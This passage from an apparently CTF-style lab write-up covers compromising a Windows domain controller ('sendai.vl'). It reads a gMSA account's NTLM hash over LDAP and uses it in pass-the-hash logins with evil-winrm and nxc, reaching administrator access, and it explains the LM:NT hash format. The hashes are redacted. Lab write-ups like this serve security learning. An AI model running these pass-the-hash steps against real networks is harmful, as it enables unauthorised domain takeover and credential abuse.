...
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: [REDACTED]     PrincipalsAllowedToReadPassword: admsvc
```

We got a hash : `[REDACTED]` however it doesn't look like a NTLMv2 hash, so we'll just use Pass-The-Hash to get a shell :

```PowerShell
>  evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H [REDACTED]  
...
```PowerShell
>  nxc winrm 10.129.234.66 -u administrator -H [REDACTED]  
  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [+] sendai.vl\administrator:[REDACTED] (Pwn3d!)  
>  evil-winrm -i 10.129.234.66 -u administrator -H [REDACTED]  
...
                                          
Error: Invalid hash format  
>  evil-winrm -i dc.sendai.vl -u administrator -H '[REDACTED]'  
...
I got it now. We got an NTLM hash (confirmed by nxc to be the right one) but to connect to the shell, we only need the NT part : the hash is divided in two parts : `[REDACTED]` and `[REDACTED]`, separated by a : which means the NTLM hash can be divided into the NT (the latter part) and LM (the former part) `LM:NT`. The first part of this NTLM hash is a dummy value because LM is disabled. Usually, the NT hash is the one we would be looking for to authenticate via Pass-The-Hash :
